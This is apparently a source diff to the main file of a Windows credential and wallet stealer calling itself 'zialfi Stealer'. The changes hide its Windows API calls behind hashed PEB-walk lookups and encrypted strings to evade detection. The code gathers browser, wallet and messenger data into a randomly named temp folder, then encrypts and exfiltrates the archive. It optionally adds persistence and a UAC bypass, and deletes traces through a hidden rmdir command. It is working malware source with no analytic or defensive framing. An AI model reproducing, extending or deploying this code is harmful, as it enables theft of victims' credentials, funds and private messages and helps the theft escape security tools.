@@ -7,6 +7,8 @@
 #include "engine.h"
 #include "peb.h"
 #include "hash.h"
+#include "export_resolve.h"
+#include "enc_strings.h"
 #include "chromium.h"
 #include "firefox.h"
 #include "wallets.h"
@@ -96,9 +98,39 @@ extern int mirage_collect_system_info(char *output, size_t outlen);
 #include "file_utils.h"
 #include <stdint.h>
 
+/* ── PEB-walk singleton for Find* APIs ─────────────────────────── */
+typedef HANDLE (WINAPI *pFindFirstFileA)(LPCSTR, LPWIN32_FIND_DATAA);
+typedef BOOL   (WINAPI *pFindNextFileA)(HANDLE, LPWIN32_FIND_DATAA);
+typedef BOOL   (WINAPI *pFindClose)(HANDLE);
+
+static struct {
+    pFindFirstFileA pFF;
+    pFindNextFileA  pFN;
+    pFindClose      pFC;
+    int ready;
+} g_main_find;
+
+static int main_find_ensure_api(void) {
+    if (g_main_find.ready) return 1;
+    char dll[32]; enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, dll);
+    void *k32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
+    if (!k32) return 0;
+    char fn[32];
+    enc_decrypt(enc_FindFirstFileA, ENC_FINDFIRSTFILEA_LEN, fn);
+    g_main_find.pFF = (pFindFirstFileA)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_FindNextFileA, ENC_FINDNEXTFILEA_LEN, fn);
+    g_main_find.pFN = (pFindNextFileA)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_FindClose, ENC_FINDCLOSE_LEN, fn);
+    g_main_find.pFC = (pFindClose)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
+    if (!g_main_find.pFF || !g_main_find.pFN || !g_main_find.pFC) return 0;
+    g_main_find.ready = 1;
+    return 1;
+}
+
 /* Pack all files in output_dir into an encrypted archive buffer.
  * Returns malloc'd buffer and sets out_len, or NULL on failure. */
 static unsigned char *pack_and_encrypt_dir(const char *dir, size_t *out_len) {
+    if (!main_find_ensure_api()) return NULL;
     /* First pass: compute total size */
     size_t total = 0;
     int file_count = 0;
@@ -106,7 +138,7 @@ static unsigned char *pack_and_encrypt_dir(const char *dir, size_t *out_len) {
     snprintf(find_path, sizeof(find_path), "%s\\*", dir);
 
     WIN32_FIND_DATAA ffd;
-    HANDLE hf = FindFirstFileA(find_path, &ffd);
+    HANDLE hf = g_main_find.pFF(find_path, &ffd);
     if (hf == INVALID_HANDLE_VALUE) return NULL;
 
     do {
@@ -114,8 +146,8 @@ static unsigned char *pack_and_encrypt_dir(const char *dir, size_t *out_len) {
         size_t name_len = strlen(ffd.cFileName);
         total += 4 + name_len + 4 + ffd.nFileSizeLow;
         file_count++;
-    } while (FindNextFileA(hf, &ffd) != 0);
-    FindClose(hf);
+    } while (g_main_find.pFN(hf, &ffd) != 0);
+    g_main_find.pFC(hf);
 
     if (file_count == 0) return NULL;
 
@@ -132,7 +164,7 @@ static unsigned char *pack_and_encrypt_dir(const char *dir, size_t *out_len) {
     buf[off++] = (unsigned char)(file_count >> 16);
     buf[off++] = (unsigned char)(file_count >> 24);
 
-    hf = FindFirstFileA(find_path, &ffd);
+    hf = g_main_find.pFF(find_path, &ffd);
     if (hf == INVALID_HANDLE_VALUE) { free(buf); return NULL; }
 
     do {
@@ -161,8 +193,8 @@ static unsigned char *pack_and_encrypt_dir(const char *dir, size_t *out_len) {
         } else {
             buf[off++] = 0; buf[off++] = 0; buf[off++] = 0; buf[off++] = 0;
         }
-    } while (FindNextFileA(hf, &ffd) != 0);
-    FindClose(hf);
+    } while (g_main_find.pFN(hf, &ffd) != 0);
+    g_main_find.pFC(hf);
 
     /* Encrypt with ChaCha20-Poly1305 via archive_crypt */
     size_t enc_cap = total + 4 + 64; /* header + padding */
@@ -181,14 +213,93 @@ static unsigned char *pack_and_encrypt_dir(const char *dir, size_t *out_len) {
 }
 #endif
 
+/* ── PEB-walk singleton for main.c kernel32/shell32 APIs ──────── */
+typedef BOOL    (WINAPI *pCreateDirectoryA)(LPCSTR, LPSECURITY_ATTRIBUTES);
+typedef BOOL    (WINAPI *pCopyFileA)(LPCSTR, LPCSTR, BOOL);
+typedef DWORD   (WINAPI *pGetTempPathA)(DWORD, LPSTR);
+typedef DWORD   (WINAPI *pGetTickCount_t)(void);
+typedef DWORD   (WINAPI *pGetCurrentProcessId_t)(void);
+typedef VOID    (WINAPI *pExitProcess)(UINT);
+typedef DWORD   (WINAPI *pGetModuleFileNameA_t)(HMODULE, LPSTR, DWORD);
+typedef VOID    (WINAPI *pSleep)(DWORD);
+typedef UINT    (WINAPI *pWinExec)(LPCSTR, UINT);
+typedef HRESULT (WINAPI *pSHGetFolderPathA)(HWND, int, HANDLE, DWORD, LPSTR);
+
+static struct {
+    pCreateDirectoryA       pCDA;
+    pCopyFileA              pCFA;
+    pGetTempPathA           pGTP;
+    pGetTickCount_t         pGTC;
+    pGetCurrentProcessId_t  pGCPI;
+    pExitProcess            pEP;
+    pGetModuleFileNameA_t   pGMFNA;
+    pSleep                  pSlp;
+    pWinExec                pWE;
+    int                     ready;
+} g_main_k32;
+
+static struct {
+    pSHGetFolderPathA       pSHGFP;
+    int                     ready;
+} g_main_shell32;
+
+static int main_k32_ensure_api(void) {
+    if (g_main_k32.ready) return 1;
+    char dll[32]; char fn[32];
+    enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, dll);
+    void *k32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
+    if (!k32) return 0;
+    enc_decrypt(enc_CreateDirectoryA, ENC_CREATEDIRECTORYA_LEN, fn);
+    g_main_k32.pCDA = (pCreateDirectoryA)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_CopyFileA, ENC_COPYFILEA_LEN, fn);
+    g_main_k32.pCFA = (pCopyFileA)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_GetTempPathA, ENC_GETTEMPPATHA_LEN, fn);
+    g_main_k32.pGTP = (pGetTempPathA)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_GetTickCount, ENC_GETTICKCOUNT_LEN, fn);
+    g_main_k32.pGTC = (pGetTickCount_t)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_GetCurrentProcessId, ENC_GETCURRENTPROCESSID_LEN, fn);
+    g_main_k32.pGCPI = (pGetCurrentProcessId_t)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_ExitProcess, ENC_EXITPROCESS_LEN, fn);
+    g_main_k32.pEP = (pExitProcess)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_GetModuleFileNameA, ENC_GETMODULEFILENAMEA_LEN, fn);
+    g_main_k32.pGMFNA = (pGetModuleFileNameA_t)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_Sleep, ENC_SLEEP_LEN, fn);
+    g_main_k32.pSlp = (pSleep)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_WinExec, ENC_WINEXEC_LEN, fn);
+    g_main_k32.pWE = (pWinExec)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
+    if (!g_main_k32.pCDA || !g_main_k32.pCFA || !g_main_k32.pGTP ||
+        !g_main_k32.pGTC || !g_main_k32.pGCPI || !g_main_k32.pEP ||
+        !g_main_k32.pGMFNA || !g_main_k32.pSlp || !g_main_k32.pWE)
+        return 0;
+    g_main_k32.ready = 1;
+    return 1;
+}
+
+static int main_shell32_ensure_api(void) {
+    if (g_main_shell32.ready) return 1;
+    char dll[32]; char fn[32];
+    enc_decrypt(enc_shell32, ENC_SHELL32_LEN, dll);
+    void *s32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
+    if (!s32) return 0;
+    enc_decrypt(enc_SHGetFolderPathA, ENC_SHGETFOLDERPATHA_LEN, fn);
+    g_main_shell32.pSHGFP = (pSHGetFolderPathA)mirage_get_function_by_hash(s32, mirage_encrypted_hash_func(fn));
+    if (!g_main_shell32.pSHGFP) return 0;
+    g_main_shell32.ready = 1;
+    return 1;
+}
+
 static void get_appdata_local(char *buf, size_t len) {
-    if (SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, buf) != S_OK)
-        snprintf(buf, len, "C:\\Users\\%s\\AppData\\Local", getenv("USERNAME") ? getenv("USERNAME") : "user");
+    if (main_shell32_ensure_api() &&
+        g_main_shell32.pSHGFP(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, buf) == S_OK)
+        return;
+    snprintf(buf, len, "C:\\Users\\%s\\AppData\\Local", getenv("USERNAME") ? getenv("USERNAME") : "user");
 }
 
 static void get_appdata_roaming(char *buf, size_t len) {
-    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, buf) != S_OK)
-        snprintf(buf, len, "C:\\Users\\%s\\AppData\\Roaming", getenv("USERNAME") ? getenv("USERNAME") : "user");
+    if (main_shell32_ensure_api() &&
+        g_main_shell32.pSHGFP(NULL, CSIDL_APPDATA, NULL, 0, buf) == S_OK)
+        return;
+    snprintf(buf, len, "C:\\Users\\%s\\AppData\\Roaming", getenv("USERNAME") ? getenv("USERNAME") : "user");
 }
 
 static void write_string_array(const char *path, char **items, size_t count) {
@@ -255,7 +366,7 @@ static void save_messenger_files(const char *output_dir, const char *subdir, Mes
 
     char dest_dir[MAX_PATH];
     snprintf(dest_dir, sizeof(dest_dir), "%s\\%s", output_dir, subdir);
-    CreateDirectoryA(dest_dir, NULL);
+    g_main_k32.pCDA(dest_dir, NULL);
 
     for (size_t i = 0; i < m->count; i++) {
         if (!m->files[i]) continue;
@@ -266,7 +377,7 @@ static void save_messenger_files(const char *output_dir, const char *subdir, Mes
 
         char dest[MAX_PATH];
         snprintf(dest, sizeof(dest), "%s\\%s", dest_dir, fname);
-        CopyFileA(m->files[i], dest, FALSE);
+        g_main_k32.pCFA(m->files[i], dest, FALSE);
         dbg_printf("[+] Copied %s -> %s\n", m->files[i], dest);
     }
 }
@@ -281,6 +392,7 @@ static void save_text_to_file(const char *path, const char *text) {
 
 int main(int argc, char *argv[]) {
     (void)argc; (void)argv;
+    if (!main_k32_ensure_api()) return 1;
 
     /* ── Evasion first ────────────────────────────────────── */
 #ifndef ZIALFI_TEST_MODE
@@ -295,12 +407,13 @@ int main(int argc, char *argv[]) {
 #endif
 #ifdef ENABLE_UAC_BYPASS
     if (!mirage_is_elevated()) {
+        if (!main_k32_ensure_api()) return 0;
         char exe_path[MAX_PATH];
-        DWORD path_len2 = GetModuleFileNameA(NULL, exe_path, sizeof(exe_path));
+        DWORD path_len2 = g_main_k32.pGMFNA(NULL, exe_path, sizeof(exe_path));
         if (path_len2 > 0 && path_len2 < sizeof(exe_path)) {
             mirage_uac_bypass(exe_path);
         }
-        ExitProcess(0);
+        g_main_k32.pEP(0);
     }
 #endif
 #endif /* !ZIALFI_TEST_MODE */
@@ -320,12 +433,12 @@ int main(int argc, char *argv[]) {
     dbg_printf("[*] zialfi Stealer (C11) starting...\n");
 
     char tmpdir[MAX_PATH], local[MAX_PATH], roaming[MAX_PATH], output_dir[MAX_PATH];
-    GetTempPathA(MAX_PATH, tmpdir);
+    g_main_k32.pGTP(MAX_PATH, tmpdir);
     /* Generate random dir name to avoid detection */
-    srand(GetTickCount());
+    srand(g_main_k32.pGTC());
     snprintf(output_dir, sizeof(output_dir), "%s\\%08x",
-             tmpdir, (unsigned)(rand() ^ (unsigned)GetCurrentProcessId()));
-    CreateDirectoryA(output_dir, NULL);
+             tmpdir, (unsigned)(rand() ^ (unsigned)g_main_k32.pGCPI()));
+    g_main_k32.pCDA(output_dir, NULL);
 
     get_appdata_local(local, sizeof(local));
     get_appdata_roaming(roaming, sizeof(roaming));
@@ -491,7 +604,7 @@ int main(int argc, char *argv[]) {
 #ifdef ENABLE_PERSISTENCE
     {
         char exe_path[MAX_PATH];
-        DWORD path_len = GetModuleFileNameA(NULL, exe_path, sizeof(exe_path));
+        DWORD path_len = g_main_k32.pGMFNA(NULL, exe_path, sizeof(exe_path));
         if (path_len > 0 && path_len < sizeof(exe_path)) {
             PersistResult pr = persistence_install(exe_path);
             (void)pr;
@@ -515,7 +628,7 @@ int main(int argc, char *argv[]) {
                                archive, archive_len, metadata) == 0) {
                     exfil_ok = 1;
                 } else if (attempt < 2) {
-                    Sleep(2000);
+                    g_main_k32.pSlp(2000);
                 }
             }
             free(archive);
@@ -533,13 +646,13 @@ int main(int argc, char *argv[]) {
     {
         char del_path[MAX_PATH + 8];
         snprintf(del_path, sizeof(del_path), "rmdir /s /q \"%s\"", output_dir);
-        WinExec(del_path, SW_HIDE);
+        g_main_k32.pWE(del_path, SW_HIDE);
     }
 #else
     if (exfil_ok) {
         char del_path[MAX_PATH + 8];
         snprintf(del_path, sizeof(del_path), "rmdir /s /q \"%s\"", output_dir);
-        WinExec(del_path, SW_HIDE);
+        g_main_k32.pWE(del_path, SW_HIDE);
     }
 #endif
 
